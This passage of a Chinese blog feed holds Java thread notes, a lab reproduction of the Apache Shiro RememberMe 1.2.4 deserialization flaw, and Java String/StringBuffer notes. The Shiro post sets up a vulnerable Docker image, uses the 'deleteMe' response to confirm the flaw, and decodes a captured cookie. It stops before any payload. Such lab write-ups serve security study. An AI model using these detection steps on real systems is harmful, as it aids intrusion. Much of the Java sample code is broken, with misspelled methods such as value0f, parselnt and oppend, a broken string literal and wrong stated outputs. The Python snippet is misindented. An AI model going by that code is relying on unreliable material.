id="aa-notify"><a href="#aa-notify" class="headerlink" title="aa.notify()"></a>aa.notify()</h4><ul><li>假设执行aa.notify()的当前线程为T1</li><li>如果当前时刻有其他线程因为执行了aa.wait()而陷入阻塞状态，则叫醒其中的一个,</li><li>所谓叫醒某个线程就是令该线程从因为wai而陷入阻塞的状态转入就绪状态</li></ul><h4 id="aa-notifyAll"><a href="#aa-notifyAll" class="headerlink" title="aa.notifyAll()"></a>aa.notifyAll()</h4><ul><li>叫醒其他<strong>所有</strong>的因为执行了aa.wait()而陷入阻塞状态的线程</li></ul><h1 id="生产消费【经典问题】"><a href="#生产消费【经典问题】" class="headerlink" title="生产消费【经典问题】"></a>生产消费【经典问题】</h1><p>​    一个仓库最多容纳6个产品，制造商现在要制造20件产品存入仓库，消费者要从仓库取出这20件产品来消费，制造商制造产品和消费者取出产品的速度很可能是不一样的，编程实现两者的同步</p><h1 id="两类线程："><a href="#两类线程：" class="headerlink" title="两类线程："></a>两类线程：</h1><p>​    一、我不终止整个程序不能终止</p><p>​    二、我没终止其他线程停止我也立即停止</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;线程&quot;&gt;&lt;a href=&quot;#线程&quot; class=&quot;headerlink&quot; title=&quot;线程&quot;&gt;&lt;/a&gt;线程&lt;/h1&gt;&lt;h2 id=&quot;什么叫程序&quot;&gt;&lt;a href=&quot;#什么叫程序&quot; class=&quot;headerlink&quot; title=&quot;什么叫程序&quot;&gt;&lt;/a&gt;什么叫程</summary>
      
    
    
    
    <category term="Java" scheme="http://example.com/categories/Java/"/>
    
    
  </entry>
  
  <entry>
    <title>一Shiro RememberMe 1.2.4 反序列化导致的命令执行漏洞复现</title>
    <link href="http://example.com/2021/04/15/%E4%B8%80Shiro-RememberMe-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://example.com/2021/04/15/%E4%B8%80Shiro-RememberMe-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-04-15T05:49:15.000Z</published>
    <updated>2021-04-24T07:09:56.917Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p>​    Apache Shiro 在 Java 的权限及安全验证框架中占用重要的一席之地，在它编号为550的 issue 中爆出严重的 Java 反序列化漏洞。</p><h1 id="0x01-漏洞场景还原"><a href="#0x01-漏洞场景还原" class="headerlink" title="0x01 漏洞场景还原"></a>0x01 漏洞场景还原</h1><p>环境搭建：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apt-get install docker</span><br><span class="line">apt-get install docker-compose</span><br><span class="line">reboot</span><br><span class="line">service docker start （每次开机需要重新启动服务）</span><br><span class="line">docker pull medicean&#x2F;vulapps:s_shiro_1 (漫长的下载)</span><br><span class="line">docker run -d -p 80:8080 medicean&#x2F;vulapps:s_shiro_1</span><br></pre></td></tr></table></figure><p>访问ip，出现以下页面即搭建成功：</p><p><img src="/2021/04/15/%E4%B8%80Shiro-RememberMe-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%8E%AF%E5%A2%83%E5%9B%BE1.png"></p><h1 id="0x02-漏洞验证"><a href="#0x02-漏洞验证" class="headerlink" title="0x02 漏洞验证"></a>0x02 漏洞验证</h1><p>访问ip，点击<code>Log in</code>，进行登录</p><p><img src="/2021/04/15/%E4%B8%80Shiro-RememberMe-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A21.png"></p><p>Username 和 Password 随意输入，但<strong>一定要勾选</strong><code>Remember Me</code>，点击Login 进行抓包</p><p><img src="/2021/04/15/%E4%B8%80Shiro-RememberMe-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A22.png"></p><p>数据包发送至<code>Repeater模块</code>再次发送，出现<code>deleteMe</code>则漏洞存在</p><p><img src="/2021/04/15/%E4%B8%80Shiro-RememberMe-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E.png"></p><h1 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h1><p>​    从官方文档中，知道在Shiro配置类中加入rememberMe管理器代码中写到cookie加密密钥默认为<strong>AES算法</strong>  </p><p>​    Apache Shiro默认使用了<code>CookieRememberMeManager</code>，其处理cookie的流程是：得到<code>rememberMe的cookie值</code> &gt;  <code>Base64解码</code>–&gt;<code>AES解密</code>–&gt;<code>反序列化</code> AES的密钥是硬编码，密钥存储在源码中，分析源码就可获得密钥</p><p>从官方的 issue 上来看，存在几个重要的点:</p><ul><li>rememberMe cookie</li><li>CookieRememberMeManager.java</li><li>Base64</li><li>AES</li><li>加密密钥硬编码</li><li>Java serialization</li></ul><p>输入正确账户，获取cookie值</p><p><img src="/2021/04/15/%E4%B8%80Shiro-RememberMe-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E8%8E%B7%E5%8F%96cookie.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dQf1WDa09v4TDHbM1PZPi6sBhQ3zl1OwDb1S+65wgSBl8TYuJ9KJ9cXgR0CPCk1LiUEZPoSzvruwEklb8GSdIydV8NjnJiKxysiEWzG1j+WTu536Rdl8b6Q&#x2F;XNrNStpUSq3e9XELd0nFYYTeN0T9PJY0aXoJZiXdX7&#x2F;+0XcMhYhktyY+TmDAjDce2Th15sQmltPHJt6q0xX&#x2F;nttUd3n&#x2F;b5mnezxBenwiqWyuG8zNFIZOU7iVsga8UwqthnZsUwF7JkJBWMO3duSxcpTO9G5NmdWf1CnkCFmItyjyomZRLiiSU8CSsrrSGgg7k4BoIC6kH9NuMwwKbBKzofmViN9NxnKw+zWo6FJd8t8sRitAsIv+6FS1dqCA&#x2F;smFivXJ3hu052f5greHTT4nmwPBGB3dGpR6497roCVCFpaGV89rN72dFPpHakitEXFJc92VJnAdnKpvlsTNnzhRRWJDb5nA0p1jn&#x2F;iI&#x2F;ckSiXxKiKDN9TyrOpVviekVCKau+BNxa6dG</span><br></pre></td></tr></table></figure><p>进行在线base64解码，发现为乱码</p><p><img src="/2021/04/15/%E4%B8%80Shiro-RememberMe-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/base64%E8%A7%A3%E7%A0%811.png"></p><p>将解码内容存储为二进制文件 1.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">str1 = <span class="string">&quot;dQf1WDa09v4TDHbM1PZPi6sBhQ3zl1OwDb1S+65wgSBl8TYuJ9KJ9cXgR0CPCk1LiUEZPoSzvruwEklb8GSdIydV8NjnJiKxysiEWzG1j+WTu536Rdl8b6Q/XNrNStpUSq3e9XELd0nFYYTeN0T9PJY0aXoJZiXdX7/+0XcMhYhktyY+TmDAjDce2Th15sQmltPHJt6q0xX/nttUd3n/b5mnezxBenwiqWyuG8zNFIZOU7iVsga8UwqthnZsUwF7JkJBWMO3duSxcpTO9G5NmdWf1CnkCFmItyjyomZRLiiSU8CSsrrSGgg7k4BoIC6kH9NuMwwKbBKzofmViN9NxnKw+zWo6FJd8t8sRitAsIv+6FS1dqCA/smFivXJ3hu052f5greHTT4nmwPBGB3dGpR6497roCVCFpaGV89rN72dFPpHakitEXFJc92VJnAdnKpvlsTNnzhRRWJDb5nA0p1jn/iI/ckSiXxKiKDN9TyrOpVviekVCKau+BNxa6dG&quot;</span></span><br><span class="line">tem = base64.b64decode(str1)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;test.bin&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:                                           </span><br><span class="line">      f.write(tem)</span><br><span class="line"> f.close()</span><br></pre></td></tr></table></figure><p><img src="/2021/04/15/%E4%B8%80Shiro-RememberMe-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E8%A7%A3%E7%A0%81%E5%90%8E%E4%BA%8C%E8%BF%9B%E5%88%B6.png"></p><p>没有看到有明确的 Java 序列化特征字</p><p><strong>Java 序列化特征字</strong></p><p>​    <strong><code>实现Serializable接口</code></strong></p><p>相关文章链接</p><p><a href>https://blog.csdn.net/u013378306/article/details/107741539</a></p><p><a href="https://blog.csdn.net/u013378306/article/details/107741539">https://blog.csdn.net/lqzkcx3/article/details/79463450</a></p><p><a href="https://blog.csdn.net/lqzkcx3/article/details/79463450">https://www.cnblogs.com/wxgblogs/p/5849951.html</a></p><p>根据文章提到了 AES 和 加密密钥硬编码，所以需要去源码寻找密钥</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-概述&quot;&gt;&lt;a href=&quot;#0x00-概述&quot; class=&quot;headerlink&quot; title=&quot;0x00 概述&quot;&gt;&lt;/a&gt;0x00 概述&lt;/h1&gt;&lt;p&gt;​    Apache Shiro 在 Java 的权限及安全验证框架中占用重要的一席之地，在它编号</summary>
      
    
    
    
    <category term="漏洞复现" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>Java 5String类</title>
    <link href="http://example.com/2021/04/15/Java-5String%E7%B1%BB/"/>
    <id>http://example.com/2021/04/15/Java-5String%E7%B1%BB/</id>
    <published>2021-04-15T02:55:50.000Z</published>
    <updated>2021-04-20T13:54:51.086Z</updated>
    
    <content type="html"><![CDATA[<h1 id="String类"><a href="#String类" class="headerlink" title="String类"></a>String类</h1><ul><li>java.lang.String类对象表示不可修改的Unicode编码字符串</li><li>在Java中<strong>双引号括起来的字符串也被当做String对象</strong><ul><li>system.out.printIn(“abc”.length()); //输出3<br>system.out.printIn(“abc”.equals(“abc”)); //输出true</li></ul></li></ul><p><strong>Steing类的equals已被重写相等为true</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String str1 = <span class="keyword">new</span> String(<span class="string">&quot;china&quot;</span>);</span><br><span class="line">String str2 = <span class="keyword">new</span> String(<span class="string">&quot;china&quot;</span>);</span><br><span class="line">System.out.println(str1.equals(str2)):</span><br><span class="line">___________________________</span><br><span class="line">    输出结果</span><br><span class="line">    <span class="keyword">true</span></span><br></pre></td></tr></table></figure><p><strong>==号比较自身，equals比较指向内容</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (str1 == str2)<span class="comment">//是判断str1和str2自身的内容是否相等?还是用来判断str1指向的对象的内容和str2指向的对象的内容是否相等?   答：代表前者</span></span><br><span class="line">System.out.println(<span class="string">&quot;str1 == str2&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">System.out.println(<span class="string">&quot;str1 != str2&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="String类示例内存示意图"><a href="#String类示例内存示意图" class="headerlink" title="String类示例内存示意图"></a>String类示例内存示意图</h2><p>​    <strong>字符串常量是在数据区存放</strong></p><p><img src="/2021/04/15/Java-5String%E7%B1%BB/%E7%A4%BA%E6%84%8F%E5%9B%BE1.png"></p><p><img src="/2021/04/15/Java-5String%E7%B1%BB/%E7%A4%BA%E6%84%8F%E5%9B%BE2.png"></p><h1 id="String类的常用方法-字符串和整数的相互转化"><a href="#String类的常用方法-字符串和整数的相互转化" class="headerlink" title="String类的常用方法   字符串和整数的相互转化"></a>String类的常用方法   字符串和整数的相互转化</h1><p>常用方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">char</span> <span class="title">charat</span><span class="params">(<span class="keyword">int</span> index)</span>  返回字符串中第index个字符</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">length</span><span class="params">()</span>  返回字符串的长度</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">indexof</span> <span class="params">(string str)</span>  返回字符串中出现str的第一个位置</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">indexof</span><span class="params">(string str,<span class="keyword">int</span> fromIndex)</span>  返回字符串中从fromIndex开始出现str的第一个位置</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equalsIgnoreCase</span> <span class="params">(string another)</span>  比较字符串与another是否一样（忽略大小写)</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">replace</span><span class="params">(<span class="keyword">char</span> oldChar ,<span class="keyword">char</span> newChar)</span>  在字符串中用newchar字符替换oldchar字符</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">char</span> <span class="title">charat</span><span class="params">(<span class="keyword">int</span> index)</span>   返回字符串中第index个字符</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">length</span><span class="params">()</span>   返回字符串的长度</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">indexof</span> <span class="params">(string str)</span>  返回字符串中出现str的第一个位置</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">indexof</span><span class="params">(string str,<span class="keyword">int</span> fromIndex)</span>   返回字符串中从fromIndex开始出现str的第一个位置</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equalsIgnoreCase</span> <span class="params">(string another)</span>  比较字符串与another是否一样（忽略大小写)</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> string <span class="title">replace</span><span class="params">(<span class="keyword">char</span> oldChar ,<span class="keyword">char</span> newChar)</span>  在字符串中用newchar字符替换oldchar字符</span></span><br></pre></td></tr></table></figure><p>​    静态方法 </p><p>​    <code>public String[] split(String regex)</code>可以将一个字符串按照指定的分隔符分隔，返回分隔后的字符串数组。</p><p>​    <code>public static String valueOf(...)</code> 可以将基本类型数据转换为字符串<strong>（字符转换）</strong></p><p>例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestSt</span> <span class="title">ring_2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">123</span>;</span><br><span class="line">        String str <span class="string">&quot;456&quot;</span>;</span><br><span class="line">        <span class="comment">//str = i; //error</span></span><br><span class="line">        <span class="comment">//i = str; //error</span></span><br><span class="line">        str = String.value0f(i);</span><br><span class="line">        System.out.printf(<span class="string">&quot;str = %s\n&quot;</span>, str);</span><br><span class="line">        </span><br><span class="line">        i = Integer.parselnt(str);</span><br><span class="line">        System.out.printf(<span class="string">&quot;i = %d\n&quot;</span>，i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h2><p>1.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String s1 = <span class="string">&quot;sun java&quot;</span>;</span><br><span class="line">        String s2 =<span class="string">&quot;sun Java&quot;</span>;</span><br><span class="line">        System.out.println(s1.charAt(<span class="number">1</span>)); <span class="comment">//u</span></span><br><span class="line">        System.out.println(s2.length()); <span class="comment">//8</span></span><br><span class="line">        System.out.println(s1.indexOf(<span class="string">&quot;java&quot;</span>)); <span class="comment">//4</span></span><br><span class="line">        System.out.println(s1.indexOf(<span class="string">&quot;Java&quot;</span>)); <span class="comment">//-1</span></span><br><span class="line">        System.out.println(s1.equals(s2)); <span class="comment">//false</span></span><br><span class="line">        System.out.println(s1.equalsIgnoreCase(s2) ); <span class="comment">//true</span></span><br><span class="line">        </span><br><span class="line">        String s =<span class="string">&quot;我是程序员，我在学java&quot;</span>;</span><br><span class="line">        String sr = s.replace(<span class="string">&#x27;我&#x27;</span>,<span class="string">&#x27;你&#x27;</span>);</span><br><span class="line">        System.out.println(sr); <span class="comment">//你是程序员,你在学java</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String s = <span class="string">&quot;welcome to Java world!&quot;</span>;</span><br><span class="line">        String s1 = <span class="string">&quot;sun java&quot;</span>;</span><br><span class="line">        System.out.println(s.startswith(<span class="string">&quot;welcome&quot;</span>)); <span class="comment">//true</span></span><br><span class="line">        System.out-println(s.endswith(<span class="string">&quot;world&quot;</span>)); <span class="comment">//false</span></span><br><span class="line">        String sL = s.toLowerCase();</span><br><span class="line">        String sU = s.toUpperCase();</span><br><span class="line">        System.out.println(sL);  <span class="comment">//welcome to java world!</span></span><br><span class="line">        System.out.println(sU); <span class="comment">//wELCOMETo JAVA WORLD!</span></span><br><span class="line">        String subs = s.substring(<span class="number">11</span>);</span><br><span class="line">        System.out.println(subs); <span class="comment">//Java world!</span></span><br><span class="line">        String sp =s1.trim();</span><br><span class="line">        System.out.println(sp); <span class="comment">//sun java</span></span><br><span class="line">    &#125;                                                       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">1234567</span>;</span><br><span class="line">String sNumber = String.valueof(j);</span><br><span class="line">        System.out.println(<span class="string">&quot;j 是&quot;</span> + sNumber.length() + <span class="string">&quot;位数。&quot;</span>);</span><br><span class="line">        String s = <span class="string">&quot;Mary,F,1976&quot;</span>;</span><br><span class="line">String[] sPlit = <span class="string">&#x27;s.split(”,&quot;);</span></span><br><span class="line"><span class="string">        for(int i=0; i &lt; sPlit.iength; i++)</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">System.out.println(sPlit[i]);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">______________________________________</span></span><br><span class="line"><span class="string">    输出结果</span></span><br><span class="line"><span class="string">    j 是7位数。</span></span><br><span class="line"><span class="string">    Mary</span></span><br><span class="line"><span class="string">F</span></span><br><span class="line"><span class="string">1976</span></span><br></pre></td></tr></table></figure><h1 id="printf-和-println"><a href="#printf-和-println" class="headerlink" title="printf 和 println"></a>printf 和 println</h1><p>多个参数可以使用printf ，输出几进制进制用prtinf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int i, j，k;</span><br><span class="line">i &#x3D; 1;</span><br><span class="line">j &#x3D; 2;</span><br><span class="line">k &#x3D; 3;</span><br><span class="line">System.out.printf(&quot;%d的值 + %d的值 是 %d\n&quot;, i, j, k);</span><br><span class="line">System.out.printf(i + &quot;的值 +&quot; + j + &quot;的值 是&quot; + k);</span><br></pre></td></tr></table></figure><h1 id="StringBuffer类由来"><a href="#StringBuffer类由来" class="headerlink" title="StringBuffer类由来"></a>StringBuffer类由来</h1><ul><li>String类对象一旦创建就不可更改</li><li>如果经常对字符串内容进行修改，则使用StringBuffer.</li><li><strong>如果经常对字符串内容进行修改而使用String的话，就会导致即耗空间又耗时间!</strong></li><li>StringBuffer对象的内容是可以改变的</li><li><strong>因此String类中没有修改字符串的方法，但是StringBuffer类中却有大量修改字符串的方法</strong></li></ul><h1 id="StringBuffer类的构造函数"><a href="#StringBuffer类的构造函数" class="headerlink" title="StringBuffer类的构造函数"></a>StringBuffer类的构造函数</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">StringBuffer</span><span class="params">()</span></span></span><br><span class="line"><span class="function">创建一个空的没有任何字符的StringBuffer对象</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">StringBuffer</span><span class="params">(<span class="keyword">int</span> capacity)</span></span></span><br><span class="line"><span class="function">创建一个不带字符，但具有指定初始容量的字符串缓冲区。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">StringBuffer</span><span class="params">(String str)</span></span></span><br><span class="line"><span class="function">创建一个StringBuffer对象，包含与str对象相同的字符序列</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">例子</span></span><br><span class="line"><span class="function">   StringBuffer s </span>= <span class="keyword">new</span> StringBuffer(str);</span><br></pre></td></tr></table></figure><p>字符串本身就是string对象</p><p>例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestStringBuffer</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        StringBuffer sb= <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        sb.append(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">        sb.oppend(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;sb= &quot;</span>+ sb); <span class="comment">//sb= abc123</span></span><br><span class="line">        sb.insert(<span class="number">3</span>,<span class="string">&quot;--&quot;</span>);</span><br><span class="line">        System.out.printin(<span class="string">&quot;sb = &quot;</span> + sb); <span class="comment">//sb = abc--123</span></span><br><span class="line">        sb.delete(<span class="number">2</span>,<span class="number">6</span>); <span class="comment">//把下标从2开始到6-1结束的字符到除</span></span><br><span class="line">        System.out.println(<span class="string">&quot;sb = &quot;</span> + sb); <span class="comment">//sb = ab23</span></span><br><span class="line">        sb.reverse();</span><br><span class="line">        system.out.println(<span class="string">&quot;sb= &quot;</span> + sb); <span class="comment">//sb = 32ba</span></span><br><span class="line">        String str = sb.toString();</span><br><span class="line">        System.out.printf(<span class="string">&quot;str = &quot;</span> + str); <span class="comment">//str = 32ba</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>StringBuffer常用方法查阅手册</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;String类&quot;&gt;&lt;a href=&quot;#String类&quot; class=&quot;headerlink&quot; title=&quot;String类&quot;&gt;&lt;/a&gt;String类&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;java.lang.String类对象表示不可修改的Unicode编码字符串&lt;/li&gt;
</summary>
      
    
    
    
